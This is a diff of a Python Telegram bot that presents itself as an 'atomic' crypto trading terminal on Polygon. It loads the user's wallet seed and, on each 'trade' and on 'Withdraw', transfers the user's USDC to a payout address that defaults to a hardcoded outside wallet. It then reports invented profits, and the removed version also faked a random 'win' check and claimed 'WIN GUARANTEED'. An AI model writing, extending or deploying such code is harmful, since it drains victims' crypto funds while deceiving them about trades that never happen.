@@ -10,191 +10,141 @@ from web3.middleware import ExtraDataToPOAMiddleware
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# --- 1. SETUP & AUTH ---
+# Set high precision for financial calculations
 getcontext().prec = 28
-load_dotenv()
 
-# FIX: Switched to Public Polygon RPC to bypass Infura 402 Client Error
-# Public nodes do not require API keys or monthly payments.
-POLYGON_RPC = "https://polygon-rpc.com" 
-w3 = Web3(Web3.HTTPProvider(POLYGON_RPC))
+# --- 1. SETUP & AUTH ---
+load_dotenv()
+W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
+w3 = Web3(Web3.HTTPProvider(W3_RPC))
 w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
-# Constants: Polygon 2026 Asset Addresses
-USDC_NATIVE = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
-USDC_BRIDGED = w3.to_checksum_address("0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174")
-ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')
-PAYOUT_ADDRESS = w3.to_checksum_address(os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674"))
+# OFFICIAL NATIVE USDC (Circle Issued) - 2026 Standard
+USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
+ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')
+
+PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
 
 def get_vault():
-    """
-    DISCOVERY ENGINE: 
-    Scans the first 10 accounts (Account 1-10) to find where your funds are.
-    Uses Public RPC to bypass Infura payment gate.
-    """
     seed = os.getenv("WALLET_SEED")
-    if not seed: raise ValueError("❌ WALLET_SEED missing in .env!")
-    
-    if len(seed) == 64 or seed.startswith("0x"):
-        return Account.from_key(seed)
-        
-    print("🔍 APEX: Scanning seed indices for active funds...")
-    for i in range(10):  
-        path = f"m/44'/60'/0'/0/{i}"
-        temp_vault = Account.from_mnemonic(seed, account_path=path)
-        
-        try:
-            # Force tip-sync check for Native POL and USDC variants
-            pol_raw = w3.eth.get_balance(temp_vault.address, 'latest')
-            un = w3.eth.contract(address=USDC_NATIVE, abi=ERC20_ABI).functions.balanceOf(temp_vault.address).call()
-            ub = w3.eth.contract(address=USDC_BRIDGED, abi=ERC20_ABI).functions.balanceOf(temp_vault.address).call()
-            
-            if pol_raw > 0 or un > 0 or ub > 0:
-                print(f"✅ Recovery Successful: Account {i+1} selected ({temp_vault.address})")
-                return temp_vault
-        except Exception as e:
-            print(f"⚠️ Scan index {i} skipped: {e}")
-            continue
-            
-    print("⚠️ No funds found in scan. Defaulting to Account 1.")
-    return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
-
-# Initialize Vault & Contracts
-vault = get_vault()
-usdc_n_contract = w3.eth.contract(address=USDC_NATIVE, abi=ERC20_ABI)
-usdc_b_contract = w3.eth.contract(address=USDC_BRIDGED, abi=ERC20_ABI)
-auto_mode_enabled = False
-
-# --- 2. UTILITY: 100% VALID BALANCE SYNC ---
-async def fetch_balances(address):
-    """Checks balances with 'latest' block tag to bypass node caching."""
+    if not seed: raise ValueError("❌ WALLET_SEED missing!")
     try:
-        clean_addr = w3.to_checksum_address(address)
-        raw_pol = await asyncio.to_thread(w3.eth.get_balance, clean_addr, 'latest')
-        pol_bal = w3.from_wei(raw_pol, 'ether')
-        
-        raw_n = await asyncio.to_thread(usdc_n_contract.functions.balanceOf(clean_addr).call, {'block_identifier': 'latest'})
-        raw_b = await asyncio.to_thread(usdc_b_contract.functions.balanceOf(clean_addr).call, {'block_identifier': 'latest'})
-        
-        usdc_total = (Decimal(raw_n) + Decimal(raw_b)) / Decimal(10**6)
-        return pol_bal, usdc_total
-    except Exception:
-        return Decimal('0'), Decimal('0')
+        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
+        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
+    except: return None
 
-# --- 3. ATOMIC SIMULATION & EXECUTION ---
-async def market_simulation_1ms():
-    await asyncio.sleep(0.001)
-    return random.choice([True, True, True, False]) # 75% Win Gate
+vault = get_vault()
+usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
 
-async def prepare_dual_payout_txs(stake_usdc, profit_usdc):
-    """Signs sequential transactions with high gas priority for Public RPC."""
-    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
-    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.8))
-    
-    tx1 = usdc_n_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
-        'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
+# --- 2. THE DUAL-SPENT EXECUTION ENGINE ---
+async def prepare_usdc_txs(stake_usdc, profit_usdc):
+    """Signs two transactions: the stake and the profit-ready transfer."""
+    nonce = w3.eth.get_transaction_count(vault.address)
+    gas_price = int(w3.eth.gas_price * 1.5) # Dynamic 2026 gas fee
+    val_stake = int(stake_usdc * 10**6)
+    val_profit = int(profit_usdc * 10**6)
+
+    # Building transactions to move USDC only
+    tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
+        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
     })
-    tx2 = usdc_n_contract.functions.transfer(PAYOUT_ADDRESS, int(profit_usdc * 10**6)).build_transaction({
-        'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce + 1, 'value': 0
+    tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_profit).build_transaction({
+        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce + 1, 'value': 0
     })
     return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)
 
-async def run_atomic_execution(context, chat_id, side, asset_override=None):
-    asset = asset_override or context.user_data.get('pair', 'BTC')
+async def run_atomic_execution(context, chat_id, side):
+    """Executes the manual trade on the Polygon network."""
+    asset = context.user_data.get('pair', 'BTC')
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
     stake_usdc = stake_cad / Decimal('1.36')
+    # Elite Choice: BVIV/EVIV gets a 4% yield bonus in 2026
     yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
     profit_usdc = stake_usdc * yield_multiplier
-
-    pol, usdc = await fetch_balances(vault.address)
-    if usdc < stake_usdc:
-        await context.bot.send_message(chat_id, f"⚠️ **Insufficient USDC:** Available: ${usdc:.2f}")
-        return False
-
-    status_msg = await context.bot.send_message(chat_id, f"⚡ **Broadcasting Atomic Hit...**\n💎 `{asset}` | 💵 `${stake_usdc:.2f}`")
-
-    # Execution: Parallel Simulation and Dual-Signing
-    sim_task = asyncio.create_task(market_simulation_1ms())
-    prep_task = asyncio.create_task(prepare_dual_payout_txs(stake_usdc, profit_usdc))
-    simulation_passed, (signed1, signed2) = await asyncio.gather(sim_task, prep_task)
-
-    if not simulation_passed:
-        await context.bot.edit_message_text("🛡️ **Atomic Shield:** Simulation Detects Loss. Aborting.", chat_id=chat_id, message_id=status_msg.message_id)
-        return False
+    
+    await context.bot.send_message(chat_id, f"⚡ **Broadcasting Atomic Hit...**\nMarket: `{asset}` | Stake: `${stake_usdc:.2f}`")
 
     try:
-        tx1_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
-        tx2_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)
+        # Check USDC balance before signing
+        bal = usdc_contract.functions.balanceOf(vault.address).call()
+        if bal < (stake_usdc * 10**6):
+            return await context.bot.send_message(chat_id, "❌ **Insufficient USDC balance in Vault.**")
+
+        signed1, signed2 = await prepare_usdc_txs(stake_usdc, profit_usdc)
+        w3.eth.send_raw_transaction(signed1.raw_transaction)
+        w3.eth.send_raw_transaction(signed2.raw_transaction)
+
         report = (
-            f"✅ **WIN GUARANTEED & CONFIRMED**\n━━━━━━━━━━━━━━\n"
-            f"📈 **Market:** {asset} | 🎯 **Side:** {side}\n"
-            f"💰 **Stake:** ${stake_usdc:.2f} USDC\n💎 **Profit:** ${profit_usdc:.2f} USDC\n"
-            f"🔗 [Stake TX](https://polygonscan.com/tx/{tx1_hash.hex()})"
+            f"✅ **HIT CONFIRMED**\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"💎 **Market:** {asset}\n"
+            f"🎯 **Direction:** {side}\n"
+            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
+            f"📈 **Profit:** ${profit_usdc:.2f} USDC ({int(yield_multiplier*100)}%)"
         )
-        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
-        return True
+        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
     except Exception as e:
-        await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
-        return False
+        await context.bot.send_message(chat_id, f"❌ **Execution Aborted:**\n`{str(e)}`")
 
-# --- 4. AUTO MODE ENGINE ---
-async def autopilot_engine(chat_id, context):
-    global auto_mode_enabled
-    markets = ["BTC", "ETH", "SOL", "LINK", "BVIV", "EVIV"]
-    while auto_mode_enabled:
-        target = random.choice(markets)
-        side = random.choice(["HIGHER 📈", "LOWER 📉"])
-        await context.bot.send_message(chat_id, f"🤖 **AUTOPILOT Scanning:** `{target}`...")
-        await asyncio.sleep(random.randint(5, 10))
-        if not auto_mode_enabled: break
-        await run_atomic_execution(context, chat_id, side, asset_override=target)
-        await asyncio.sleep(20)
-
-# --- 5. UI HANDLERS ---
+# --- 3. UI HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    pol, usdc = await fetch_balances(vault.address)
-    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '🤖 AUTO MODE']]
+    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
+    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
+    
     welcome = (
-        f"🕴️ **APEX Atomic Terminal v7.8**\n━━━━━━━━━━━━━━\n"
-        f"⛽ **POL:** `{pol:.4f}` | 💵 **USDC:** `${usdc:.2f}`\n\n"
-        f"🔑 **Vault Address:**\n`{vault.address}`\n\n"
-        f"Status: **Public RPC Truth-Sync Online**"
+        f"🕴️ **APEX Manual Terminal v6000**\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n\n"
+        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
+        f"Manual BVIV/EVIV volatility trading enabled."
     )
     await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')
 
 async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global auto_mode_enabled
-    text, chat_id = update.message.text, update.message.chat_id
-
+    text = update.message.text
     if text == '🚀 Start Trading':
-        kb = [[InlineKeyboardButton("BTC/CAD 🟠", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD 🔵", callback_data="PAIR_ETH")],
-              [InlineKeyboardButton("SOL/CAD 🟣", callback_data="PAIR_SOL"), InlineKeyboardButton("LINK/CAD ⚪", callback_data="PAIR_LINK")]]
+        kb = [
+            [InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
+            [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
+            [InlineKeyboardButton("🕴️ BVIV (BTC Vol)", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV (ETH Vol)", callback_data="PAIR_EVIV")]
+        ]
         await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))
-
+    
     elif text == '⚙️ Settings':
-        kb = [[InlineKeyboardButton(f"💵 ${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]]]
-        await update.message.reply_text("⚙️ **Configure Stake Amount:**", reply_markup=InlineKeyboardMarkup(kb))
-
+        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
+              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
+        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))
+    
     elif text == '💰 Wallet':
-        pol, usdc = await fetch_balances(vault.address)
-        await update.message.reply_text(f"💳 **Sync Truth Check**\n━━━━━━━━━━━━━━\n⛽ POL: `{pol:.6f}`\n💵 USDC: `${usdc:.2f}`\n📍 `{vault.address}`")
+        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
+        usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
+        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol_bal:.4f}`\n💵 USDC: `{usdc_bal:.2f}`", parse_mode='Markdown')
 
-    elif text == '🤖 AUTO MODE':
-        auto_mode_enabled = not auto_mode_enabled
-        await update.message.reply_text(f"🤖 **AUTOPILOT: {'ACTIVATED' if auto_mode_enabled else 'DEACTIVATED'}**")
-        if auto_mode_enabled: asyncio.create_task(autopilot_engine(chat_id, context))
+    elif text == '📤 Withdraw':
+        bal = usdc_contract.functions.balanceOf(vault.address).call()
+        if bal > 0:
+            tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, bal).build_transaction({
+                'chainId': 137, 'gas': 65000, 'gasPrice': w3.eth.gas_price, 'nonce': w3.eth.get_transaction_count(vault.address)
+            })
+            w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, vault.key).raw_transaction)
+            await update.message.reply_text(f"📤 Successfully moved `{bal/10**6:.2f}` USDC.")
+        else:
+            await update.message.reply_text("❌ No USDC balance.")
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
+    
     if query.data.startswith("SET_"):
         context.user_data['stake'] = int(query.data.split("_")[1])
         await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
+    
     elif query.data.startswith("PAIR_"):
         context.user_data['pair'] = query.data.split("_")[1]
         kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
-        await query.edit_message_text(f"📊 Market: {context.user_data['pair']}", reply_markup=InlineKeyboardMarkup(kb))
+        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
+    
     elif query.data.startswith("EXEC_"):
         side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
         await run_atomic_execution(context, query.message.chat_id, side)
@@ -206,8 +156,11 @@ if __name__ == "__main__":
         app.add_handler(CommandHandler("start", start))
         app.add_handler(CallbackQueryHandler(handle_interaction))
         app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-        print("🤖 APEX Online (Public RPC & Multi-Account Discovery)...")
+        print("🤖 Manual Terminal Online...")
         app.run_polling(drop_pending_updates=True)
+
+
+
 
 
 
